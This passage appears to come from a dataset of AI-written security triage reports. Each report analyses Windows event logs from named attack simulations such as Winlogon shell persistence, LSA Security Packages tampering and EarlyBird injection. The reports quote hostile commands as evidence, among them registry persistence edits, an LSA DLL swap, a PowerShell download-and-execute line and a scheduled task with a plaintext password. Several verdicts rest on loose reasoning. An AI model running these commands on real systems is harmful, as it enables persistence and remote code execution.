- **Multiple Process Launches**: Frequent utilization of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` within a short time span may indicate attempts to manipulate event logs or hide malicious activities, though further investigation would be required to confirm.

#### 3. Security and System Logs:

- **Time Discrepancies**: An observed time adjustment (Event ID 4616), where the system time was modified, is usually benign but could indicate attempts to alter logs and timestamps.
  
#### Assessment:

The activity across these logs showcases behavior typical of attempts to establish persistence and potentially obfuscate actions (persistent scripts and time changes). The repeated execution of scripts from a Startup folder, which can induce them to execute on boot, combined with tools like `wevtutil.exe`, often linked with manipulation or querying of event logs, triggers concern for malicious activity.

### Resolution:
- **SUSPICIOUS**: The analysis indicates suspicious behavior due to the creation and execution of scripts intended for persistence, possibly indicating preliminary stages of compromise. While these actions are suspicious and carry risk, the absence of overt malicious payloads in the logs prevents classification as definitely malicious.

### Recommended Next Steps:

1. **Isolate and Monitor the Host**: Restrict network activity temporarily and monitor for further suspicious actions.
2. **Examine the VBScript**: Analyze the `vbsstartup.vbs` file contents to determine its functionality and any references to malicious activities or infrastructure.
3. **Conduct a Full Endpoint Scan**: Use Endpoint Detection and Response (EDR) tools to scan the system for malware or anomalies aligning with known attack vectors.
4. **Review User Activity**: Investigate recent activities and any unusual login attempts pertaining to user `admin_test`.

These steps will help ascertain whether the detected activities constitute part of a larger compromise and allow for timely remediation actions."
PowerShell Modify A Scheduled Task,"Upon reviewing the provided Windows event logs, several aspects of potential interest have been identified that warrant further investigation:

1. **Scheduled Task Creation via PowerShell**:
   - The PowerShell logs indicate the use of a script to create a scheduled task using `cmd.exe` executed at logon with administrative privileges. This is achieved using `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, and `New-ScheduledTaskPrincipal`.
   - The task updates its action to execute `Notepad.exe`. The use of scheduled tasks to run processes at logon with high privileges can be a technique used for persistence by an attacker.

2. **Sysmon Logs**:
   - The frequent execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `admin_test` is observed. While these utilities can be used legitimately for administrative tasks, their usage in scripting scenarios alongside elevated privileges should be scrutinized, especially if not expected behavior for the user or system.
   - The execution of `powershell.exe` as indicated by event record ID `17966` with a similar command line that corresponds to creating a scheduled task should be corroborated with the system’s scheduled task list to confirm legitimacy.

3. **Time Manipulation Events**:
   - Both System and Security logs report time adjustments (`PreviousTime` and `NewTime`). This can sometimes be an indicator of an attempt to alter timestamps as part of anti-forensics measures, but might also occur due to legitimate time syncs or corrections.

4. **Security Logs**:
   - Event IDs `4624` and `4672` show logon events with administrative privileges by `admin_test` user. This user has a wide range of privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.), which could be leveraged by an attacker to compromise the system.

### Assessment
- **Scheduled Tasks and Privilege Use**: The creation and modification of scheduled tasks with high privilege using PowerShell is suspicious and suggests potential malicious persistence mechanisms.
- **Process Execution**: Administrative accounts executing command-line utilities with elevated permissions can be a security concern, particularly if pattern or behavior is atypical for the user or context.

### Resolution: **SUSPICIOUS**

The activity observed in the logs suggests potential misuse of legitimate Windows functions for persistence with elevated privileges, which is often a sign of early or ongoing malicious activity.

### Guidance:
- **Investigate Scheduled Tasks**: Verify the legitimacy of the scheduled tasks created or modified around the logged timestamp and cross-reference with expected administrator activity or maintenance logs.
- **User Behavior Analysis**: Confirm with the user `admin_test` or cross-reference patterns in other logs (e.g. login times, other systems accessed) to validate or refute the legitimacy of the observed actions.
- **Forensic Analysis**: Check for additional signs of intrusion or compromise within the system, such as unauthorized data access, lateral movement, or installation of malicious software.
- **Review Security Posture**: Ensure adequate monitoring and alerting is conducting around high privilege accounts and administrative actions to detect potential breaches earlier.

Further investigation is needed to conclusively determine whether the activities relate to legitimate administrative actions or unauthorized alterations by potential adversaries. Engaging incident response teams for deeper forensic analysis and system hardening is advisable."
Suspicious jse file run from startup Folder,"Upon reviewing the provided event logs, there are several elements that stand out as suspicious and may warrant further investigation:

### **Detailed Analysis:**

1. **Windows Security Logs:**
   - **Event ID 4616:** These log entries indicate a change in system time, managed by `svchost.exe` running under the `LOCAL SERVICE` account. Altering system time can be a tactic to evade logs and should be reviewed to ensure it aligns with legitimate system administration tasks.

2. **PowerShell Logs:**
   - **Event ID 600:** These logs show PowerShell commands executing that involve copying a file `jsestartup.jse` to the Windows Startup folders and executing them with `cscript.exe`. This behavior is suspicious as these actions can be used to establish persistence by ensuring a script runs at startup, which is a common tactic in malware.
   - The script execution with `cscript.exe /E:Jscript` is particularly concerning since JScript can be used to execute potentially malicious scripts.

3. **Sysmon Logs:**
   - Multiple entries for processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` are seen, all involving the user `SERVER002\admin_test`. While some of these might be valid administrative actions, combined with malicious use of PowerShell, they could indicate reconnaissance or an attempt to look for system information.
   - **Sysmon Event ID 1:** Also, the execution of `PowerShell.exe` with suspicious command lines highlights the PowerShell events mentioned before.
   - **EdgeUpdate Events:** While Edge Update processes are generally legitimate, a careful review is necessary because these could be leveraged in fileless attacks or abused by malware hiding in system updates. 

4. **Application Logs:**
   - Logs from the `edgeupdate` service show service stops, which is normal behavior, yet it was happening around the same time as the suspicious activities. This parallel could be coincidental, but in context, it deserves scrutiny.

5. **System Logs:**
   - Similar observations with the time change events as seen in the Windows Security logs.

### **Assessment:**

- The pairings and timings of PowerShell script executions, alterations of system time, and the Windows scheduled or service tasks (like Edge update) indicate potentially coordinated activity which could be attributed to an adversary attempting to gain persistence or execute a payload upon system startup.
  
### **Resolution:** 

Based on the above activities, these logs are assessed as **SUSPICIOUS**. There is clear evidence of potentially malicious operations, especially with the intent to modify or execute in startup paths using PowerShell scripts typical of malware operations. These activities need to be investigated further to validate their legitimacy or confirm malicious intent.

### **Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the host from the network to prevent further spread.
   - Retrieve and quarantine the file `jsestartup.jse` for further analysis outside of the environment.
   - Examine the user account `SERVER002\admin_test` for unauthorized access or misuse.
  
2. **Further Investigation:**
   - Review associated systems and network logs to identify any lateral movement or data exfiltration.
   - Correlate logs with other security data sources to identify potential indicators of compromise.
   - Conduct endpoint scans for additional artifacts like unknown services, registry changes, or other persistence mechanisms.

3. **Long-term Actions:**
   - Implement Host Intrusion Detection Systems (HIDS) or enhance existing configurations to improve detection capabilities.
   - Conduct training with IT staff to prevent PowerShell misuse and enforce least privilege principles for service accounts.

Reaching out to relevant security operations personnel and decision-makers with this information would be prudent to initiate these further actions and protect organizational assets."
Winlogon Shell Key Persistence - PowerShell,"Upon analyzing the provided Windows event logs, several events stand out as particularly noteworthy due to their potential implications for system integrity and security:

### Detailed Analysis:

#### 1. **PowerShell Activity:**
   - There are multiple PowerShell events related to a script that uses `Set-ItemProperty` to modify the registry key `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` to set the shell value to `explorer.exe, C:\Windows\System32\cmd.exe`.
   - This action is often associated with persistence techniques used by attackers where they configure a system to launch additional command interpreters like `cmd.exe` upon user login, allowing for unauthorized command execution.

#### 2. **Sysmon Events:**
   - The execution of PowerShell with a script that modifies registry settings for persistence is corroborated by Sysmon Process Create events. The `powershell.exe` process executed with the specified command, indicating it attempted to set persistence by overwriting the shell configuration.
   - `whoami.exe` and `hostname.exe` were run during the session, possibly indicating enumeration activities.

#### 3. **Security Log - Time Change Events:**
   - There are no explicit anomalous security log entries. The time change events (`EventID 4616`) logged are part of normal operations where a system might be synchronizing its clock, but they don’t typically carry harmful intent by themselves.

#### 4. **Application and System Logs:**
   - The logs contain benign entries related to normal services stopping/starting (e.g., `edgeupdate` service) and system timezone information updates, which do not raise any significant security concerns on their own.

### Assessment of Malicious Activity:
The PowerShell activity sets off significant red flags, given the context and the type of modification made to the registry, which closely aligns with known malicious behavior. This behavior indicates potential malicious intent to achieve persistence on the system.

### Resolution:
Given the potential persistence mechanism implemented by modifying the Windows shell property and its prevalence in malicious activities, the appropriate resolution is:

- **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Remediation:**
   - Isolate the affected system from the network to prevent further potential spread or damage.
   - Revert the registry changes to their default values to prevent persistent command execution on user logon.

2. **Investigation & Monitoring:**
   - Conduct a full forensic analysis of the affected system to identify any additional malicious artifacts or backdoors.
   - Review recent user activities and access logs for evidence of compromise or unauthorized access.

3. **System Hardening:**
   - Implement strict PowerShell script execution policies and use tools like AppLocker to restrict execution of unauthorized scripts.
   - Ensure all systems are configured to log detailed PowerShell activities and Sysmon events for enhanced monitoring.

4. **User Education and Awareness:**
   - Educate users about the risks of executing unknown scripts and encourage the reporting of any suspicious activities.

These actions will help mitigate the threat, ensure the integrity of the compromised system, and reduce the risk of similar incidents in the future."
LockBit Black - Modify Group policy settings -cmd,"Upon analyzing the given Windows event logs, the following points are highlighted:

1. **Time Adjustments**: The logs contain several instances of time changes (EventID: 4616 in the Security log and EventID: 1 in the System log). Time changes can occur due to legitimate system processes synchronizing the clock with an external time server, as indicated by the time source being ""time.windows.com"". These actions appear benign and typically occur without any malicious intent.

2. **Sysmon Events**: There are multiple Sysmon process creation events (EventID: 1) triggered by various processes. Notably, multiple instances of ""C:\\Windows\\System32\\wevtutil.exe"", ""C:\\Windows\\System32\\cmd.exe"", and ""C:\\Windows\\System32\\reg.exe"" followed by processes related to Microsoft Edge update are recorded:
   - Execution of `cmd.exe` with registry modification commands could be indicative of configuration changes or potentially unwanted applications disabling security features (e.g., disabling SmartScreen). This behavior is often associated with attempts to modify key system policies, which is suspicious.
   - The continuous executions of Microsoft EdgeUpdate processes (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) indicate updates might be ongoing. However, these should be further verified to confirm legitimacy, as they could mask malicious activity via legitimate software update processes.

3. **Potentially Suspicious Activities**: 
   - The registry modifications via `cmd.exe` and `reg.exe` that disable certain security features, like SmartScreen (identified within the Sysmon logs), stand out as suspicious. Disabling security features without proper change management and documentation can suggest malicious intent or unauthorized system changes.

**Assessment Summary**: 
- The presence of time changes appears benign, likely due to routine time synchronization tasks.
- The activities surrounding registry modifications necessitate further investigation, as they might signify attempts to reduce system security posture, making the system vulnerable.
- Frequent executions related to Microsoft Edge updates recorded in Sysmon logs should be confirmed against expected behavior of the update tool to rule out any discrepancies.

**Resolution**: **SUSPICIOUS**

- **Guidance to Proceed**:
  - Conduct additional investigations into the intent and the user initiating the registry changes. Validate whether these actions align with authorized administrative activities.
  - Verify the integrity and legitimacy of the Microsoft Edge update processes by checking the digital signatures and conforming to the expected update schedule.
  - Monitoring should be intensified for any further unauthorized changes, especially those altering system security settings.

This assessment classifies the event logs as containing suspicious activity due to unauthorized system changes, which warrant further analysis and potential remediation actions."
Domain Password Policy Check: Short Password,"Based on the provided Windows event logs, here is a detailed analysis of the evidence:

### Windows PowerShell Log Analysis:
1. **Password Management Script:**
   - The PowerShell logs indicate the execution of a script intended to manage passwords for a user.
   - The script checks if a file containing credentials exists, reads the credentials, verifies the current password against a proposed new password (""Uplow-1""), and attempts to change the password.
   - If the script encounters an error with error code 86, it suggests that the stored password is incorrect and instructs removing the credential file and rerunning the prerequisite commands.

**Observations:**
- The script appears to be a legitimate password management tool. However, using the same password (""Uplow-1"") repeatedly could signify poor security practices.
- The storage and access of plaintext passwords or similarly sensitive information could potentially be leveraged maliciously if mishandled.

### Sysmon Log Analysis:
1. **Process Execution:**
   - Multiple instances of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` are recorded.
   - All processes are executed by a user identified as `SERVER002\admin_test`.
   - Notably, `powershell.exe` is executed with a command line containing the same script seen in the PowerShell logs.

**Observations:**
- The presence of `wevtutil.exe` and `powershell.exe` indicates potential administrative tasks, which is consistent with the execution by an `admin_test` user.
- The execution of standard tools like `hostname.exe` and `whoami.exe` may suggest typical environment and user information gathering processes.
- Usage of `wevtutil.exe`, typically used for event log management, by an admin user does not inherently indicate malicious activity, but repeated use may warrant verification of intended tasks.

### Conclusions:
1. **Suspicious Activity:**
   - The script's handling of user credentials, specifically around password resetting and storage, could be exploit-prone if used improperly.
   - Though the script appears legitimate, reviews of the security of stored credentials and ensuring they are not accessible or poorly managed are critical security measures.

2. **Normal Administrative Processes:**
   - The execution of `wevtutil.exe` and other system utility programs by an administrator is typical, with no direct indicators of malicious intent present in the usage pattern.

### Recommendation:
- Further investigation, particularly in the configuration and accessibility of the credential storage mechanism, may be needed to prevent potential misuse or exploitation.
- Confirm with the administrator (associated with `admin_test`) the necessity of certain tasks repeated in logs, to rule out accidental or unsanctioned actions.

### Final Assessment: 
- **Resolution:** SUSPICIOUS

This assessment suggests the activities presented in the logs are mostly administrative or legitimate tasks but could benefit from a detailed check, specifically reviewing credential handling and storage practices."
Allowing custom application to execute during new RDP logon session,"### Analysis

Upon examining the provided logs, several noteworthy observations emerge:

1. **Security Log Analysis**:
   - **Event ID 4624** (Logon Event): Multiple logons using the logon type 5 (service logon) are present. This is typically benign for service accounts. However, the frequent logons with the target user being SYSTEM S-1-5-18 may merit further scrutiny.
   - **Event ID 4672** (Special Privileges): The SYSTEM account has high privileges, including SeDebugPrivilege and SeTakeOwnershipPrivilege. While this is typical for the SYSTEM account, it highlights the potential for privilege abuse if these tokens are used by unauthorized users.
   - **Event ID 4798** (User Enumeration): Frequent enumerations related to user accounts like 'Administrator', 'Guest', etc., could indicate reconnaissance activities, although certain legitimate processes may also cause this behavior.

2. **PowerShell Script Execution**:
   - Multiple PowerShell scripts are executed with commands to query or manipulate the system (`powershell.exe -ExecutionPolicy Restricted -Command ...`). The use of restricted policies reduces risk, but the executed commands' nature should be verified for legitimacy. For example, `$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); ...` appears to scan for certain install conditions, which could be part of normal system health tasks or updates.

3. **Sysmon Log Analysis**:
   - **Event ID 1 and 5 (Process Creation and Termination)**: There are numerous process creations, particularly involving processes like `CompatTelRunner.exe`, `taskhostw.exe`, `powershell.exe`, and others. These need to be contextualized against typical system operations to determine if their execution pattern is normal.
   - A concerning command is observed: `""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /v StartupPrograms /t REG_SZ /d ""calc""` which suggests a suspicious registry modification aimed at setting a startup program (`calc`) which is frequently used in privilege escalation tactics.

4. **Potential Malicious Indicators**:
   - The registry modification via cmd.exe for task startup is typically abusive as it can essentially allow code execution on logon or service start.
   - Frequent enumeration of user accounts and manipulation of multi-purpose executable files (e.g., PowerShell, cmd, taskhostw.exe) could point towards attempts to reconnoiter or tamper with the system setting for persistence or exploitation.

5. **System Log Analysis**:
   - System logs show regular Windows Update activity and time adjustments. These entries align with expected system maintenance tasks.

### Resolution

Considering the activities observed, particularly the use of command execution to modify registry entries, coupled with enumeration of user accounts and multiple system-critical process executions, our findings suggest that more investigation is needed to determine the provenance and intent of these actions.

Overall Resolution: **SUSPICIOUS**

### Guidance

1. **Conduct a Detailed Audit**: Verify the legitimacy of scripts and commands executed through PowerShell and command prompt.
2. **Investigate Registry Changes**: Investigate the necessity and the source of the registry modifications for startup programs.
3. **Monitor User Account Activities**: Further inspections into account access, especially during times of suspicious process or script executions.
4. **Assess Environmental Context**: Validation whether these logs are part of recurring legitimate maintenance tasks or indicative of unauthorized configuration changes.

Immediate steps should include restricting any verified malicious service access and reviewing similar alerts/logs across other systems in the environment. Further forensic analysis may identify the source of these potentially unwanted changes."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"Upon reviewing the event logs, here are the observations and analysis based on the different log entries provided:

### System and Security Logs:

1. **Time Change Events (EventID 24 & 1 in System log and EventID 4616 in Security log)**: 
   - The logs indicate system time changes, which are documented by events in both the System and Security logs. These raised the new time to an earlier timestamp, indicating that the system time was set back. The change occurred with `svchost.exe` as the process, and the responsible user is `LOCAL SERVICE`. 
   - While time changes can happen for legitimate reasons, repeated or unexpected time changes can be problematic, as they may be used to evade detection (e.g., modifying timestamps of files or logs).

### Application Log:

1. **Windows Security Center and Software Protection Platform (SPP)**:
   - The activity appears normal and consistent with periodic checks and logging by security services. Windows Defender is noted as being active, which is a good sign that endpoint protection is working.

### Windows PowerShell Log:

1. **PowerShell Execution (EventID 600)**:
   - The logs show PowerShell executing a command line that includes a call to download a script from a URL via `iex(new-object net.webclient).downloadstring('URL')`.
   - This behavior is highly suspicious as it indicates potential remote script execution commonly associated with malicious activity or post-exploitation actions.

### Sysmon Log:

1. **Execution of `wevtutil.exe`, `whoami.exe`, and PowerShell (EventID 1 & 5)**:
   - `wevtutil.exe` and `whoami.exe` are being executed multiple times. While `whoami.exe` is generally benign when used interactively, if launched repeatedly or in context of automated scripts, it can indicate enumeration activity.
   - The execution of `powershell.exe` with the suspicious command matches the PowerShell log observation, confirming its execution as captured by Sysmon.
   - Such activities, particularly when tied to PowerShell command execution from suspicious sources or contexts, require deeper scrutiny.

### Conclusion:

- Given the outlined activities, notably the PowerShell usage to download and potentially run a script from an external URL, alongside other suspicious activities, significant indicators of compromise or unwanted activities are present.

### Recommendation:

- Conduct immediate containment actions on the server if not already done. Review any potential alterations, particularly with system integrity and timing settings.
- The network traffic involved in the PowerShell actions should be assessed for additional analysis to determine the intent of downloaded content from the stated URL. 
- Comprehensive threat hunting across the network and deeper forensic analysis for lateral movement or additional compromise methods may be warranted.

### Final Resolution:
**MALICIOUS** - The logs contain activity that has clear signs of malicious usage, particularly through PowerShell script download and execution attempts. Further proactive responses and investigations are necessary."
HKLM - Add atomic_test key to launch executable as part of user setup,"Based on the analysis of the provided Windows event logs, here's a detailed breakdown of suspicious or anomalous behavior that stands out:

### PowerShell Logs
- The PowerShell logs contain entries of scripts being executed with commands that modify the registry. Specifically, these actions are modifying `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components` to add a new entry `file_test` and setting its properties. The `StubPath` is set to run `C:\\Windows\\System32\\calc.exe`.

### Sysmon Logs
- The Sysmon logs reveal the execution of various Windows processes, including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `runonce.exe`, all executed by a user `SERVER002\\admin_test`. Of particular interest is the execution of the PowerShell process, which matches the activity described in the PowerShell logs.
- Moreover, there are multiple executions of `MicrosoftEdgeUpdate.exe` processes, indicative of automated updates or scheduled tasks.
- The suspicious PowerShell execution described earlier has traces in the Sysmon logs as a process invocation with specific command-line arguments modifying the registry and invoking `runonce.exe`.

### Security Logs
- The Security logs display a time change by `svchost.exe`, which is often benign but can be suspicious if correlated with other signs of tampering.

### System and Application Logs
- The System and Application logs primarily contain system-related events and Edge update logs that do not directly correlate with suspicious behavior.

### Assessment
The activities in the PowerShell logs, along with corroborating Sysmon entries, point to potentially suspicious behavior, particularly the modifications of the registry to execute `calc.exe` on a system level. This could be indicative of a test or a benign administrative task, but the actions are often seen in malware behavior, especially if the execution path (`runonce.exe /AlternateShellStartup`) is used to maintain persistence.

### Conclusion
- **Resolution**: SUSPICIOUS

### Guidance
- Investigate the user `SERVER002\\admin_test` for any unauthorized or unexplained activity.
- Confirm if the registry modification scripts were executed for legitimate administrative purposes.
- Review threat intelligence to see if similar actor tactics align with known malicious campaigns.
- Conduct further monitoring of the affected host for any additional signs of persistence or execution of unauthorized processes.

Given the current findings, it's crucial to enhance monitoring and verify the source of the PowerShell scripts to mitigate potential risks."
Read-Write-Execute process Injection,"Upon reviewing the provided logs, the following details have been analyzed to assess for suspicious or malicious activity:

1. **Repeated PowerShell Execution:**
   - Several logs indicate the execution of `powershell.exe` with complex command lines involving the use of PowerShell to invoke executables (`searchVuln.exe`, `RWXinjectionLocal.exe`) located in a temporary directory. These binaries are not typical Windows binaries and appear to interact with a suspected DLL (`vuln_dll\\msys-2.0.dll`), suggesting an attempt for process injection or memory manipulation activity. This use of PowerShell with heavily obfuscated or complex commands is often indicative of malicious activity.

2. **Event ID Context:**
   - Sysmon Event ID 1 (process creation) shows the execution of unfamiliar executables from a temporary directory, often a hallmark of dropper or payload launch activities following an initial compromise. Given its parent process is PowerShell, this strengthens suspicion.
   - Event ID 5 logs image load operations but without enough details to exclusively flag them as suspicious based on path or common indicators alone.

3. **Processes and Command Lines:**
   - The construction and nature of the PowerShell command suggest automated script execution, possibly for reconnaissance (via the `searchVuln.exe`) and exploitation (via `RWXinjectionLocal.exe` targeting specific processes or DLLs).
   - The execution context involves high-integrity levels and system-level commands that aren't associated with standard operations by a user depicted as `SERVER002\\admin_test`.

4. **Parent-Child Process Relationship:**
   - Ensured tracking of process lineage indicates PowerShell as a parent to other processes which are engaging in non-standard behaviors or actions.

5. **Absence of Other Log Entries:**
   - The lack of entries in Application, System, and Security event logs prevents correlation with possible alerts or errors that might indicate lateral movement, privilege escalation, or broader system manipulation.

### Assessment and Resolution:
Given the observed behaviors — specifically the unconventional use of PowerShell to execute what seem to be custom or suspicious binaries in a method typical of exploitation frameworks — there are strong indicators of malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate containment actions should be enforced to isolate `Server002` from the network to prevent potential lateral movement.
- A deeper forensic investigation is recommended, focusing on file analysis of `searchVuln.exe` and `RWXinjectionLocal.exe` to determine their functionality and origin.
- Audit administrative accounts and related privileges to confirm legitimacy and mitigate any unauthorized access.
- Review and enforce appropriate PowerShell logging policies and restrictions, enhancing detection capabilities.
- Conduct a retrospective threat hunting exercise for any similar behaviors across the environment to preemptively mitigate broader compromise risks."
Scheduled task Remote,"Based on the provided logs, here is the detailed analysis, highlighting key activities and assessing whether any indicate malicious activity:

1. **Time Change Events:**
   - Multiple logs show changes to the system time. Event ID 4616 from the Security log and Event ID 1 from the System log record changes with a consistent time pattern aligning with Windows time synchronization activities (via svchost.exe handling time updates). This is generally not malicious by itself since time synchronization is a normal function, especially considering the time source is time.windows.com.

2. **Sysmon Events:**
   - **Execution of wevtutil.exe and conhost.exe:**
     - Several instances where `wevtutil.exe` and `conhost.exe` are executed by user `SERVER002\\admin_test`. While execution of these binaries can indicate log manipulation or illegitimate shell access in some contexts, there is no evidence from the log of malicious parameters or unusual correlation suggesting compromised activity. However, it should be monitored in case it deviates from the baseline or standard behavior for this server.
     
   - **Execution of cmd.exe with SCHTASKS:**
     - The execution of `cmd.exe` with command line parameters involving `SCHTASKS /Create` appears to configure a new scheduled task. The user `SERVER002\\admin_test` is seen running `schtasks.exe` with potentially sensitive credentials (`DOMAIN\\user` and `At0micStrong` for the password). This could either be administrative maintenance or an attempt at creating a tasks for persistence. The context of use and authorization should be validated with the owner/admin of `SERVER002`.

   - **Execution of common utilities and services:**
     - `whoami.exe`, `hostname.exe`, and processes like `TiWorker.exe`, `MicrosoftEdgeUpdate.exe` with typical images and contexts imply benign or maintenance activities unless these relate indirectly to suspicious or unauthorized changes.

3. **RISKS & THREATS ASSESSMENT:**
   - **Anomalous Behavior:** The scheduled task creation raises some concern. In malicious contexts, attackers might use such tasks for persistence. 
   - **Potential Misuse of Credentials:** Though there's no clear evidence, confirm if the user `admin_test` created the task intentionally.

4. **GUIDANCE:**
   - **Confirmation & Investigation:** Confirm with the user `admin_test` or relevant administrators if the task creation was authorized and documented as per usual workflows or maintenance schedules.
   - **Continuous Monitoring and Baseline Establishing:** Keep an eye on future log activities for similar unexpected patterns, particularly focusing on privilege-sensitive utilities like `schtasks.exe`, `wevtutil.exe`.
   - **Credential Security:** Validate that credentials used in scheduling tasks are secure and not publicly accessible or unused after job completion if temporary.

### Resolution
- **SUSPICIOUS:** The activities are not overtly malicious, but the task creation without clear authorization could signify unauthorized or shadow IT practices. Further investigation is warranted to confirm legitimacy, especially around SCHTASKS usage."
Section View Injection,"Upon reviewing the provided Windows event logs across different channels, the following findings and analysis are presented:

1. **Time Changes in Security Events:**
   - The Security log contains events with ID `4616`, indicating a time change where the `PreviousTime` is later than the `NewTime`. This kind of activity might be an attempt to manipulate time settings, often done by adversaries to disrupt logging or forensic timelines. However, it's also seen sometimes during legitimate system processes for time synchronization correction through `svchost.exe`.

2. **Privilege Escalation and Logons:**
   - Event `4634` indicates a logoff for the user `admin_test`, followed immediately by events `4672` and `4624` showing this user logging back on with significant privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege` and others, demanding a high level of scrutiny. The user logs in remotely from `192.168.1.168`, which indicates a possible legitimate remote access but requires verification. The use of NTLM authentication (recorded as `LogonType` 3) is consistent with a network logon.
   
3. **Unusual PowerShell Activity:**
   - Events in the Windows PowerShell log show a PowerShell session running a command to start processes including `notepad.exe` and a suspicious executable `InjectView.exe` located in a temp directory. This suggests potential script-based attack tactics, as temp directories are often used by malicious actors to house payloads. The command specifically targets an execution, which is indicative of potentially suspicious activity.

4. **Sysmon Process Execution:**
   - Additional Sysmon logs reveal the execution of typical administrative utilities like `hostname.exe` and `whoami.exe`, associated with the user `admin_test`. However, the presence of the `InjectView.exe` being started through PowerShell adds a layer of concern, especially in conjunction with other thundering administrative tools.

5. **Overall Analysis:**
   - While the usage of administrative tools and NTLM authentication could fit into a legitimate administrative activity pattern, the use of a PowerShell script to invoke an executable in a temp directory and time adjustments are red flags that require further analysis.
   - The risks stem from potential unauthorized access and execution of malicious software indicated by `InjectView.exe`, possibly implying a fileless attack or in-memory execution strategy that bypasses traditional endpoint defenses.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough review of administrative access logs to confirm the legitimacy of the `admin_test` user’s activities.
- Verify the origin of the `InjectView.exe` file. Consider isolating the server if the file path process seems suspicious.
- Perform network monitoring for other machines in the same subnet as the IP address `192.168.1.168` to identify any lateral movement.
- Review AV and EDR logs for anomalies surrounding the time changes and corresponding commands executed.
- Preferably, rebuild potentially compromised systems if malicious activity continues to be suspected."
EarlyBird APC Queue Injection in Go,"Upon reviewing the provided logs, several indicators of potential malicious activity were noted:

1. **PowerShell Activity**:
   - The use of `powershell.exe` with a command line involving `EarlyBird.exe` and `werfault.exe` is suspicious. The EarlyBird technique is a known method used in malware to inject code into a legitimate process before it starts executing, which can evade detection. The use of PowerShell to run this command in conjunction with `werfault.exe` (Windows Error Reporting) might be used to masquerade malicious activity as legitimate.
  
2. **Sysmon Logs**:
   - The recurrence of process executions for `C:\Windows\system32\whoami.exe`, `hostname.exe`, and other system utilities like `wevtutil.exe` under the `SERVER002\admin_test` account within a short span implies rapid execution of system enumeration commands. While not inherently malicious, this can indicate scripted activity common in malicious behaviors like reconnaissance.

3. **Privileges and Authentication**:
   - Multiple privilege assignments (`SeSecurityPrivilege`, `SeDebugPrivilege`, etc.) to `admin_test` are flagged. While the `admin_test` user could naturally require these privileges, the context of suspicious command executions warrants further investigation.
   
4. **Security Logs**:
   - There are distinct impersonations and logins using NTLM authentication with a LogonType of 3 (network logon), which might be legitimate for server operations but should be cross-verified against expected user behavior and patterns.

5. **Time Anomalies**:
   - The sequence of security events timestamps indicates time discrepancies, where the system time jumps back. This might point to time tweaks being used to confuse or bypass logging mechanisms or to perform replay attacks.

**Assessment and Recommendations**:

- **Resolution: SUSPICIOUS**: The activities observed indicate potential abnormal behavior but don't conclusively confirm a compromise. Specifically, the PowerShell command utilizing `EarlyBird.exe` with `werfault.exe` is particularly concerning and could indicate an active intrusion attempt or unauthorized script execution.
  
- **Actionable Steps**:
  1. **Investigate `admin_test` Account**: Verify account usage, ensuring any executed tasks were legitimate and expected as per job function, and check for unexpected modifications to user permissions or recent password changes.
  2. **Evaluate PowerShell Scripts**: Analyze any existing PowerShell scripts on the system for the presence of `EarlyBird.exe` calls and seek removal or further action on potentially harmful scripts.
  3. **Correlation with Network Traffic**: Cross-reference these logs against network logs to identify unusual outbound connections that align with suspicious activities.
  4. **Forensic Analysis**: Consider a deeper forensic analysis on the affected host focusing on file system changes and any unauthorized software installations or changes in system configurations.

The logs do suggest potential unnatural behaviors that require a more in-depth, manual review to determine the extent of any threat. Thus, the system merits closer monitoring and verification for any continued suspicious activities."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"Upon reviewing the provided logs, particular attention is required for events that suggest potential malicious activities. The following observations were made:

### Observations:
1. **Windows PowerShell Log:**
   - A PowerShell command was executed to alter security settings within the Windows Registry:
     ```powershell
     $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
     Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old' -Value ""$oldvalue"";
     $newvalue = ""AtomicTest.dll"";
     Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
     ```
   - This command replaces the 'Security Packages' value with a custom DLL (`AtomicTest.dll`), which is an indicator of potential malware trying to insert itself into the Local Security Authority.

2. **Event Log and Sysmon Log Entries:**
   - The system logs indicate that `wevtutil.exe cl Application`, `System`, and `Security` were executed by the `admin_test` user. This suggests that the event logs were cleared, which is a common technique to cover tracks post-compromise.
   - Multiple events indicate the execution of `MicrosoftEdgeUpdate.exe` processes and their associated temporary directories. While these could be benign updates, they warrant further verification given the context of altered security configurations.

3. **Security Log Clearance:**
   - The security logs also show that logs were cleared (`EventID 1102`). This action was conducted by the same `admin_test` user, further indicating potential malicious intent to erase forensic traces.

### Assessment:
- **Registry Modification:**
  The modification of system-critical security settings through PowerShell and the insertion of potentially malicious DLLs is highly indicative of malware activity or a targeted attack aiming to compromise the system's security infrastructure.

- **Log Clearance:**
  The clearing of event logs immediately following the suspicious PowerShell activity strongly supports the evidence of a compromise. This action is generally used by attackers to remove traces of their activity.

### Resolution: MALICIOUS

### Guidance:
- **Immediate Action Required:**
  1. **Containment:** Isolate the affected host (Server002) from the network to prevent further spread or external communication from any potential malware.
